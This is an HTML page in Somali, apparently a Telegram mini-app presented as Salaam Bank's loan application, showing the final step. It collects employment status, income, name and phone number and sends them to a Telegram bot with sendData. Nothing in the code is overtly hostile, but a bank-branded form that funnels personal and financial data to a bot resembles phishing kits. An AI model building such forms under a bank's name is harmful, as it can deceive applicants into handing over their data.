<!DOCTYPE html>
<html lang="so">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Codsiga Maalgelinta - Soo Koobid</title>

    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #0d1b2a; /* Dark Blue Base Background */
            margin: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            color: #e2e8f0;
        }

        .nav-header {
            width: 100%;
            background: linear-gradient(135deg, #001f3f 0%, #003366 100%);
            padding: 18px 20px;
            color: #f8fafc;
            display: flex;
            justify-content: space-between;
            align-items: center;
            box-sizing: border-box;
            border-bottom: 2px solid #1e3a5f;
        }

        .bank-logo {
            font-size: 22px;
            font-weight: bold;
        }

        .form-card {
            background: #1b2a4a; /* Dark Blue Card Background */
            width: 92%;
            max-width: 480px;
            margin-top: 25px;
            padding: 30px 20px;
            border-radius: 12px;
            border: 1px solid #2a3d66;
            box-shadow: 0 8px 25px rgba(0,0,0,0.3);
            box-sizing: border-box;
        }

        h2 {
            text-align: center;
            margin: 0;
            font-size: 24px;
            color: #f1f5f9; /* Dark White / Off-White */
            font-weight: 600;
        }

        .step-info {
            text-align: center;
            font-size: 14px;
            color: #94a3b8; /* Muted Dark White */
            margin: 10px 0 25px;
        }

        .progress-box {
            display: flex;
            gap: 8px;
            margin-bottom: 35px;
        }

        .bar {
            height: 4px;
            flex: 1;
            background: #38bdf8; /* Accent Blue */
            border-radius: 2px;
        }

        .input-wrap {
            margin-bottom: 22px;
        }

        label {
            display: block;
            font-size: 15px;
            font-weight: 500;
            margin-bottom: 10px;
            color: #cbd5e1; /* Off-White */
        }

        select, input {
            width: 100%;
            padding: 15px;
            border: 1px solid #334155;
            border-radius: 8px;
            font-size: 16px;
            box-sizing: border-box;
            background: #0f172a;
            color: #f8fafc;
            outline: none;
        }

        select:focus, input:focus {
            border-color: #38bdf8;
        }

        select option {
            background-color: #0f172a;
            color: #f8fafc;
        }

        .summary-box {
            background-color: #0f172a;
            border-left: 5px solid #38bdf8;
            padding: 20px;
            border-radius: 8px;
            margin: 25px 0;
            border: 1px solid #1e293b;
        }

        .summary-box h3 {
            margin: 0 0 15px 0;
            font-size: 17px;
            font-weight: 700;
            color: #f8fafc;
        }

        .summary-item {
            display: flex;
            justify-content: space-between;
            margin-bottom: 12px;
            border-bottom: 1px solid #1e293b;
            padding-bottom: 8px;
        }

        .summary-label {
            color: #94a3b8;
            font-size: 14px;
        }

        .summary-value {
            font-weight: 600;
            font-size: 14px;
            color: #f8fafc;
            text-align: right;
        }

        .btn-container {
            display: flex;
            flex-direction: column;
            gap: 15px;
        }

        .back-btn {
            background: #1e293b;
            color: #cbd5e1;
            border: 1px solid #334155;
            padding: 16px;
            border-radius: 10px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            text-transform: uppercase;
        }

        .submit-btn {
            background: linear-gradient(135deg, #003366 0%, #004080 100%);
            color: #f8fafc;
            border: 1px solid #1e40af;
            padding: 18px;
            border-radius: 10px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            text-transform: uppercase;
            transition: background 0.3s ease;
        }

        .submit-btn:active {
            background: #002244;
        }

        .footer-text {
            text-align: center;
            font-size: 12px;
            color: #64748b;
            margin: 40px 0 30px;
        }
    </style>
</head>

<body>

<div class="nav-header">
    <div onclick="goBack()" style="cursor:pointer; font-size:18px; color: #cbd5e1;">← Dib u noqyo</div>
    <div class="bank-logo">Salaam Bank</div>
    <div style="font-size: 24px;">☰</div>
</div>

<div class="form-card">
    <h2>Codsiga Maalgelinta</h2>
    <p class="step-info">Talaabada 3 oo 3 ah</p>

    <div class="progress-box">
        <div class="bar"></div>
        <div class="bar"></div>
        <div class="bar"></div>
    </div>

    <div class="input-wrap">
        <label>Xaaladda Shaqada</label>
        <select id="jobStatus">
            <option value="Shaqaale">Shaqaale</option>
            <option value="Ganacsade">Ganacsade</option>
            <option value="Aroos / Arday">Arday</option>
            <option value="Shaqo La'aan">Shaqo La'aan</option>
            <option value="Hawlgalay">Hawlgalay (Pensioneer)</option>
        </select>
    </div>

    <div class="input-wrap">
        <label>Dakhliga Sannadkii ($ USD)</label>
        <input type="text" id="income" placeholder="Tusaale: 12000">
    </div>

    <div class="summary-box">
        <h3>Soo Koobid Codsiga</h3>

        <div class="summary-item">
            <span class="summary-label">Qaddarka Maalgelinta:</span>
            <span class="summary-value" id="sumAmount">--</span>
        </div>

        <div class="summary-item">
            <span class="summary-label">Muddada Bixinta:</span>
            <span class="summary-value" id="sumDuration">--</span>
        </div>

        <div class="summary-item">
            <span class="summary-label">Ujeeddada:</span>
            <span class="summary-value" id="sumPurpose">--</span>
        </div>

        <div class="summary-item">
            <span class="summary-label">Codsadaha:</span>
            <span class="summary-value" id="sumName">--</span>
        </div>
    </div>

    <div class="btn-container">
        <button type="button" class="back-btn" onclick="goBack()">DIB U NOQO</button>
        <button type="button" class="submit-btn" onclick="submitForm()">DIR CODSIGA</button>
    </div>
</div>

<div class="footer-text">© 2026 Salaam Bank Somalia. Hantida oo dhan waa la dhowray.</div>

<script>
window.onload = () => {
    const tg = window.Telegram?.WebApp;
    if (tg) {
        tg.ready();
        tg.expand();
    }

    const amount = localStorage.getItem('amount');
    const duration = localStorage.getItem('loanDuration');
    const purpose = localStorage.getItem('loanPurpose');
    const fName = localStorage.getItem('firstName') || "";
    const lName = localStorage.getItem('lastName') || "";

    document.getElementById('sumAmount').innerText = amount ? `$${Number(amount).toLocaleString()} USD` : "--";
    document.getElementById('sumDuration').innerText = duration || "--";
    document.getElementById('sumPurpose').innerText = purpose || "--";
    document.getElementById('sumName').innerText = `${fName} ${lName}`.trim() || "--";
};

function submitForm() {
    const tg = window.Telegram?.WebApp;

    const data = {
        amount: localStorage.getItem('amount'),
        duration: localStorage.getItem('loanDuration'),
        purpose: localStorage.getItem('loanPurpose'),
        firstName: localStorage.getItem('firstName'),
        lastName: localStorage.getItem('lastName'),
        phone: localStorage.getItem('phone'),
        jobStatus: document.getElementById('jobStatus').value,
        income: document.getElementById('income').value
    };

    if (tg && tg.sendData) {
        tg.sendData(JSON.stringify(data));
        setTimeout(() => {
            window.location.href = "/page5";
        }, 500);
    } else {
        console.log("Submitted:", data);
        window.location.href = "/page5";
    }
}

function goBack() {
    window.location.href = "/page3";
}
</script>

</body>
</html>
